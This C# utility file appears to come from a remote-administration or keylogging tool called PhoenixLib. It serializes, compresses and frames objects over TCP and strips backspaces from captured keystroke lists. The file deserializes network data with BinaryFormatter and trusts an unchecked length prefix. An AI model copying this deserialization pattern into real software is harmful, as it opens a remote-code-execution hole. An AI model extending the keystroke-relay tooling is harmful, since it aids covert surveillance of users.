using Newtonsoft.Json;
using PhoenixLib.Datastore;
using PhoenixLib.Datastore.CommunicationClasses;
using PhoenixLib.Datastore.KeystrokeClasses;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net;
using System.Runtime.Serialization.Formatters.Binary;
using System.Text;
using System.Threading.Tasks;

namespace PhoenixLib.TCPLayer
{
    public static class Util
    {
        public static class Serialization
        {
            public static byte[] serialize(Object obj)
            {
                BinaryFormatter bf = new BinaryFormatter();
                using (var ms = new MemoryStream())
                {
                    bf.Serialize(ms, obj);
                    return ms.ToArray();
                }
            }

            public static Object deserialize(byte[] arrBytes)
            {
                if (arrBytes.Length != 0)
                {
                    using (var memStream = new MemoryStream())
                    {
                        var binForm = new BinaryFormatter();
                        memStream.Write(arrBytes, 0, arrBytes.Length);
                        memStream.Seek(0, SeekOrigin.Begin);
                        var obj = binForm.Deserialize(memStream);
                        return obj;
                    }
                }
                return null;
            }
            public static T deserializeJson<T>(String input)
            {
                return JsonConvert.DeserializeObject<T>(input);
            }
        }
        public static class Metadata
        {
            public static byte[] concat(params byte[][] bytes)
            {
                int length = bytes.Sum(b => (b.Length));
                byte[] returnData = new byte[length];
                int position = 0;
                foreach (byte[] data in bytes)
                {
                    Array.Copy(data, 0, returnData, position, data.Length);
                    position += data.Length;
                }
                return returnData;
            }
            public static byte[] applyDataLength(byte[] data)
            {
                byte[] length = getLengthData(data);
                return concat(length, data);
            }

            public static byte[] getLengthData(byte[] data)
            {
                return BitConverter.GetBytes(data.Length);
            }

            public static byte[] serializeReadableObject(Object obj)
            {
                byte[] data = Serialization.serialize(obj);
                data = Compression.compress(data);
                byte[] lengthData = getLengthData(data);
                return concat(lengthData, data);
            }
            public static Object deserializeReadableObject(byte[] data, bool hasLengthMetadata)
            {
                Object obj = null;
                if (hasLengthMetadata)
                {
                    int length = BitConverter.ToInt32(data, 0);
                    byte[] objectData = new byte[length];
                    Array.Copy(data, 4, objectData, 0, length);
                    objectData = Compression.decompress(objectData);
                    obj = Serialization.deserialize(objectData);
                }
                else
                {
                    obj = Serialization.deserialize(data);
                }
                return obj;
            }
            public static RegistryKeyData Find(RegistryKeyData node, RegistryKeyData entry)
            {

                if (node == null)
                    return null;

                if (node.Equals(entry))
                    return node;

                foreach (RegistryKeyData child in node.data)
                {
                    RegistryKeyData found = Find(child, entry);
                    if (found != null)
                        return found;
                }

                return null;
            }
        }
        public static class Conversion
        {
            public static T changeType<T>(object input)
            {
                return (T)Convert.ChangeType(input, typeof(T));
            }
            public static String bytesToString(byte[] data)
            {
                return Encoding.ASCII.GetString(data);
            }
            public static byte[] stringToBytes(String s)
            {
                return Encoding.ASCII.GetBytes(s);
            }
            public static List<KeyPressed> removeBackspaceData(List<KeyPressed> data)
            {
                Stack<KeyPressed> stack = new Stack<KeyPressed>();
                foreach (KeyPressed press in data)
                {
                    if (press.KeyCode.Equals(KeyCode.Back))
                    {
                        if (stack.Count != 0)
                        {
                            stack.Pop();
                        }
                    }
                    else
                    {
                        stack.Push(press);
                    }
                }
                return stack.ToList().Reverse<KeyPressed>().ToList();
            }
        }
        public static class Integrity
        {
            public static byte[] receiveAndConfirmMessageFromStream(TCPConnection connection)
            {
                byte[] lenBuffer = new byte[4];
                connection.readBytes(ref lenBuffer, 0, lenBuffer.Length);
                int len = BitConverter.ToInt32(lenBuffer, 0);
                byte[] data = new byte[len];
                int bytesRead = 0;
                while (bytesRead < len)
                {
                    data[bytesRead] = connection.readByte();
                    bytesRead++;
                }
                data = Compression.decompress(data);
                return data;
            }
            public static void sendObject(TCPConnection connection, Object obj)
            {
                byte[] serialized = Metadata.serializeReadableObject(obj);
                connection.sendBytes(serialized, 0, serialized.Length);
            }
            public static Command nullCommand = new Command
            {
                action = ActionType.NOP,
            };
        }
        public static class DNS
        {
            public static IPAddress[] resolveIP(String host)
            {
                return Dns.GetHostAddresses(host);
            }
            public static bool isIPAddress(String input)
            {
                IPAddress temp;
                return IPAddress.TryParse(input, out temp);
            }
        }
        public static class Compression
        {
            public static byte[] compress(byte[] data)
            {
                using (MemoryStream memory = new MemoryStream())
                {
                    using (GZipStream compressionStream = new GZipStream(memory, CompressionMode.Compress))
                    {
                        compressionStream.Write(data, 0, data.Length);
                    }
                    return memory.ToArray();
                }
            }
            public static byte[] decompress(byte[] data)
            {
                using (GZipStream stream = new GZipStream(new MemoryStream(data), CompressionMode.Decompress))
                {
                    const int size = 4096;
                    byte[] buffer = new byte[size];
                    using (MemoryStream memory = new MemoryStream())
                    {
                        int count = 0;
                        do
                        {
                            count = stream.Read(buffer, 0, size);
                            if (count > 0)
                            {
                                memory.Write(buffer, 0, count);
                            }
                        }
                        while (count > 0);
                        return memory.ToArray();
                    }
                }
            }
        }
    }
}
